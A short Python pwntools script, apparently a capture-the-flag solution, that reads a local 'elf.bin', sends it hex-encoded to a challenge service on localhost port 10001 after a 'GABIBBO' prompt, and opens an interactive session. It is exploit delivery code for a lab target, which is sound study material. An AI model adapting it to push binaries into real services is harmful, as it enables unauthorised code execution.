#!/usr/bin/env python3

from pwn import remote


def main():
    with open("elf.bin", "rb") as infile:
        elf_content = infile.read()

    io = remote("localhost", 10001)
    io.sendlineafter(b" only 'GABIBBOGABIBBOGABIBBOGABIBBO'", elf_content.hex().encode())
    io.sendline(b"GABIBBOGABIBBOGABIBBOGABIBBO")

    io.interactive()


if __name__ == "__main__":
    main()
